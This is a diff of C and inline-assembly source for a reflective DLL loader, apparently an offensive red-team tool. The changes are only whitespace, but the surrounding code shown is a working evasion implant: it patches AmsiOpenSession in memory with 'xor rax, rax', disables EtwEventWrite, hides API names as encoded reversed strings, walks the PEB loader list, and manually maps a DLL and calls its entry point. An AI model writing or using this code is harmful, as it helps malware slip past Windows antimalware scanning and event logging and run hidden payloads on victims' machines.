@@ -5,7 +5,6 @@
 #ifdef BYPASS
 typedef BOOL    (WINAPI * tWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
 #endif
-
 typedef BOOL    (WINAPI * DLLMAIN)( HINSTANCE, DWORD, LPVOID );
 typedef HMODULE (WINAPI * tLoadLibraryA)(LPCSTR lpLibFileName);
 typedef FARPROC (WINAPI * tGetProcAddress) (HMODULE hModule, LPCSTR lpProcName);
@@ -38,7 +37,7 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 	tNtFlushInstructionCache pNtFlushInstructionCache = NULL;
 	// KERNEL32 Variables
 	PVOID kernel32Addr, kernel32ExportDirectory, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable;
-
+	
 	char getProcAddrStr[] = "f#A@4!g.22y:23";
 	PVOID getProcAddrStrLen = (PVOID)14;
 	tGetProcAddress pGetProcAddress = NULL;
@@ -54,7 +53,6 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 	// STEP X: Resolve the addresses of NTDLL and Kernel32 from the Loader via GS>TEB>PEB>LDR>InMemoryOrderModuleList
 	//   - This is done by matching the first 4 unicode charaters of the DLL BaseName
 	char ntdlStr[] = "ntdl"; // L"ntdll.dll" - Only need the first 4 unicode bytes to find the DLL from the loader list
-;
 	ntdllAddr = (PVOID)crawlLdrDllList((PVOID)ntdlStr);
 	ntdllExportDirectory = getExportDirectory(ntdllAddr);
 	ntdllExAddrTable = getExportAddressTable(ntdllAddr, ntdllExportDirectory);
@@ -133,9 +131,9 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 	// AMSI.AmsiOpenSession Bypass
 	char amsiStr[] = "f!@.24#.62#6.2#"; // have space in reserved bytes for null string terminator
 	//char amsiStr[] = "amsi.dll12345678;
-    // python reverse.py amsi.dll12345678
-    // String length : 8
-    //   lld.isma : 6c6c642e69736d61
+	// python reverse.py amsi.dll12345678
+	// String length : 8
+	//   lld.isma : 6c6c642e69736d61
 	__asm__(
 		"mov rsi, %[amsiStr] \n"
 		"xor rdx, rdx \n"                // null string terminator
@@ -178,11 +176,11 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 	SIZE_T bytesWritten;
 	unsigned char amsibypass[] = { 0x48, 0x31, 0xC0 }; // xor rax, rax
 	char WriteProcessMemoryStr[] = "g90.-13#5@3.-t3;5#9-.[3";
-    // $ python reverse.py WriteProcessMemory
-    // String length : 18
-    //   yr : 7972
-    //   omeMssec : 6f6d654d73736563
-    //   orPetirW : 6f72506574697257
+	// $ python reverse.py WriteProcessMemory
+	// String length : 18
+	//   yr : 7972
+	//   omeMssec : 6f6d654d73736563
+	//   orPetirW : 6f72506574697257
 	__asm__(
 		"mov rsi, %[WriteProcessMemoryStr] \n"
 		"mov rcx, 0xFFFFFFFFFFFF868D \n" // NOT yr       : 7972
@@ -201,10 +199,10 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 	pWriteProcessMemory((PVOID)-1, pAmsiOpenSession, (PVOID)amsibypass, sizeof(amsibypass), &bytesWritten);
 	// ETW.EtwEventWrite Bypass // Credit: @_xpn_ & @ajpc500 // https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/ & https://github.com/ajpc500/BOFs/blob/main/ETW/etw.c
 	char EtwEventWriteStr[] = "f9#.^124.-.32";
-    // python reverse.py EtwEventWrite
-    // String length : 13
-    //   etirW    : 6574697257
-    //   tnevEwtE : 746e657645777445
+	// python reverse.py EtwEventWrite
+	// String length : 13
+	//   etirW    : 6574697257
+	//   tnevEwtE : 746e657645777445
 	__asm__(
 		"mov rsi, %[EtwEventWriteStr] \n"
 		"mov r8,  0xFFFFFF9A8B968DA8 \n" // NOT etirW    : 6574697257
@@ -286,8 +284,8 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 	);
 
 	// STEP 3 | Copy/write the sections from init RDLL to new RDLL
-// RdllNthSectionAddr = the VA of the first section
-// RdllNthSectionAddr = ( (PVOID)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader );
+	// RdllNthSectionAddr = the VA of the first section
+	// RdllNthSectionAddr = ( (PVOID)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader );
 	// Get the Optional Header Address
 	// (PVOID)&((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader
 	PVOID OptionalHeaderAddr;
@@ -322,7 +320,7 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 		:[OptionalHeaderAddr] "r" (OptionalHeaderAddr),
 		 [SizeOfOptionalHeader] "r" (SizeOfOptionalHeader)
 	);
-// END of finding RdllNthSectionAddr
+	// END of finding RdllNthSectionAddr
 
 	// itterate through all sections, loading them into memory.
 	// ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->FileHeader.NumberOfSections;
@@ -439,7 +437,7 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 		);
 	}
 
-// STEP 4: process our images import table
+	// STEP 4: process our images import table
 
 	// STEP 4.1 | Get the address of our RDLL's Import Directory entry in within the Data Directory of the Optional Header
 	// rdllDataDirImportDirectoryAddr = (PVOID)&((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];
@@ -454,10 +452,10 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 		:[OptionalHeaderAddr] "r" (OptionalHeaderAddr)
 	);
 	// STEP 4.2 | Get the Address of the Import Directory from the Data Directory
-//     typedef struct _IMAGE_DATA_DIRECTORY {
-//       DWORD VirtualAddress;
-//       DWORD Size;
-//     } IMAGE_DATA_DIRECTORY,*PIMAGE_DATA_DIRECTORY;
+	//     typedef struct _IMAGE_DATA_DIRECTORY {
+	//       DWORD VirtualAddress;
+	//       DWORD Size;
+	//     } IMAGE_DATA_DIRECTORY,*PIMAGE_DATA_DIRECTORY;
 	//  rdllImportDirectoryAddr = newRdllAddr + ((PIMAGE_DATA_DIRECTORY)rdllDataDirImportDirectoryAddr)->VirtualAddress 
 	PVOID rdllImportDirectoryAddr;
 	__asm__(
@@ -655,7 +653,7 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 					:[importAddressTableEntry] "r" (importAddressTableEntry),  // RAX = The import table entry we are going to overwrite
 					 [importEntryAddressRVA] "r" (importEntryAddressRVA),  // RDX = 00007FFA56740000 &ws2_32.dll
 					 [ImportedDllAddr] "r" (ImportedDllAddr) // RCX = ws2_32.00007FFA5678E500
-              	);
+              			);
 			}
 			else
 			{
@@ -744,13 +742,13 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 			"mov r11, %[newRdllAddr] \n"
 			"xor rbx, rbx \n"
 			"xor r12, r12 \n"
-			"add rax, 0xC  \n" 	     // 12 (0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
-			"mov ebx, [rax] \n"      // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->Name into EBX
-			"push rbx \n"            // save the RVA for the Name of the DLL to be imported to the top of the stack
-			"pop r12 \n"             // R12&RBX = RVA of Name DLL
-			"cmp ebx, 0x0 \n"        // if this value is 0 we are at the end of the DLL's we need to import symbols/functions/api's from
+			"add rax, 0xC  \n"  // 12 (0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
+			"mov ebx, [rax] \n" // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->Name into EBX
+			"push rbx \n"       // save the RVA for the Name of the DLL to be imported to the top of the stack
+			"pop r12 \n"        // R12&RBX = RVA of Name DLL
+			"cmp ebx, 0x0 \n"   // if this value is 0 we are at the end of the DLL's we need to import symbols/functions/api's from
 			"je check2 \n"
-			"add rbx, r11 \n" 		 // Address of Module String = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name 
+			"add rbx, r11 \n"   // Address of Module String = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name 
 			"check2: \n"
 			"mov %[importNameRVA], r12 \n" 
 			"mov %[importName], rbx \n" 
@@ -893,7 +891,6 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 				:[nextRelocBlockEntryAddress] "=r" (nextRelocBlockEntryAddress)
 				:[nextRelocationBlock] "r" (nextRelocationBlock)
 			);
-
 			// we itterate through all the entries in the current block...
 			while( RelocBlockEntries-- )
 			{
@@ -926,7 +923,6 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
                      			:[inNextRelocBlockEntryAddress] "r" (nextRelocBlockEntryAddress)
                  		);
 			}
-
 			// get the next entry in the relocation directory
 			// nextRelocationBlock = nextRelocationBlock + relocSizeOfBlock;
 			__asm__(
@@ -949,7 +945,6 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 			);
 		}
 	}
-
 	// STEP 6: call our images entry point
 	// the VA of our newly loaded DLL/EXE's entry point
 	PVOID newRdllAddrEntryPoint;
@@ -973,7 +968,6 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 	((DLLMAIN)newRdllAddrEntryPoint)( (HINSTANCE)newRdllAddr, DLL_PROCESS_ATTACH, NULL );
 	return newRdllAddrEntryPoint;
 }
-
 // Takes in the 4 first for unicode characters (8 bytes) of a DLL and returns the base address of that DLL module if it is already loaded into memory
 PVOID crawlLdrDllList(wchar_t * dllName)
 {
